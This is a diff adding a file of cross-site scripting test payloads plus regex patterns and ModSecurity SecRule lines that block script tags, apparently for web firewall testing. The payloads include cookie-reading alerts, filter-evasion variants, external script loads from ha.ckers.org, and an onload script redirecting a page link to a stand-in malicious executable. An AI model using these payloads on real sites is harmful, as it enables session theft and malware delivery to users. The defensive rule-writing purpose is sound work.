@@ -1,0 +1,23 @@
+<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a"); AllLinks[0].href = "http://badexample.com/malicious.exe"; }</script>
+"><script >alert(document.cookie)</script>
+"><ScRiPt>alert(document.cookie)</ScRiPt>
+"%3cscript%3ealert(document.cookie)%3c/script%3e
+<scr<script>ipt>alert(document.cookie)</script>
+<script>alert(123)</script>
+<script>alert("hellox worldss");</script>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+
+(((((("|<)*)(\>|[a-z])*)(((((\%[A-Za-z0-9]*)|\s|\<))(SCRIPT))((\%[A-Za-z0-9]*)|\>|\s|\<))).*(\/SCRIPT).*))
+
+
+(("|<)*(\>|[a-z])*)((\%[A-Za-z0-9]*)|\s|\<)SCRIPT((\%[A-Za-z0-9]*)|\>|\s|\<).*(\/SCRIPT).*
+
+
+SecRule REQUEST_URI "(((((("|<)*)(\>|[a-z])*)(((((\%[A-Za-z0-9]*)|\s|\<))(SCRIPT))((\%[A-Za-z0-9]*)|\>|\s|\<))).*(\/SCRIPT).*))" log,block,status:406
+
+
+SecRule ARGS NAME:search "(((((("|<)*)(\>|[a-z])*)(((((\%[A-Za-z0-9]*)|\s|\<))(SCRIPT))((\%[A-Za-z0-9]*)|\>|\s|\<))).*(\/SCRIPT).*))" log,block,status:406
